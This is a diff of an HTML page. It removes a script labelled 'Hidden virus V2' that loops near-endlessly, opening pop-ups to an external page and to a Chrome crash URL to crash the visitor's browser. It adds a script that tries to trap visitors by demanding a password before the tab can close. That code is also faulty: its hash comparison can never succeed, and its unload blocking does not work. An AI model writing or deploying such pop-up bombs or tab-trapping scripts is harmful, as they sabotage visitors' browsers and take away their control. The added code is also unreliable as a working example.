@@ -1,18 +1,70 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Hidden virus V2</title>
+  <title>Tab Close Confirmation with Hashed Password</title>
 </head>
-    <body>
-        <script>
-            for (var i = 0; i < 99999999999999999; i++) {
-                    window.open("https://pa30292.github.io/viru/hidden.html","","height=400,width=400,left=0,top=0");
-                    window.open("chrome://inducebrowsercrashforrealz");
-                    window.open("https://pa30292.github.io/viru/hidden.html","","height=400,width=400,left=100,top=0");
-                }
-        </script>
-    </body>
+<body>
+
+<script>
+// Function to hash the password using SHA-256
+async function hashPassword(password) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(password);
+  const hash = await crypto.subtle.digest('SHA-256', data);
+  return hash;
+}
+
+// Define the hashed passcode
+let hashedPassCode;
+
+// Hash the passcode when the page loads
+window.onload = async function () {
+  const passCode = 'passCode';
+  const hashed = await hashPassword(passCode);
+  hashedPassCode = hashed;
+}
+
+// Function to prompt for password and compare hashed values
+async function promptForPassword() {
+  const password = prompt('Enter password to close the tab:');
+  const hashedPassword = await hashPassword(password);
+
+  // Convert hashedPassword to a string for comparison
+  const hashedPasswordString = Array.from(new Uint8Array(hashedPassword))
+    .map(byte => ('00' + byte.toString(16)).slice(-2))
+    .join('');
+
+  if (hashedPasswordString === hashedPassCode) {
+    return true; // Password is correct
+  } else {
+    alert('Incorrect password. Please try again.');
+    return false; // Password is incorrect
+  }
+}
+
+// Add event listener for beforeunload to trigger confirmation
+window.addEventListener('beforeunload', function (e) {
+  const confirmationMessage = 'Are you sure you want to leave?';
+  e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+
+  return confirmationMessage; // Gecko, WebKit, Chrome <34
+});
+
+// Add event listener for closing the window/tab
+window.addEventListener('unload', function (e) {
+  const confirmed = promptForPassword();
+  if (!confirmed) {
+    e.preventDefault();
+  }
+});
+
+// Open a new tab and immediately close it
+const newTab = window.open();
+if (newTab) {
+  newTab.close();
+} else {
+  alert('Your browser blocked the automatic tab closing. Please allow pop-ups for this website.');
+}
+</script>
+
+</body>
 </html>
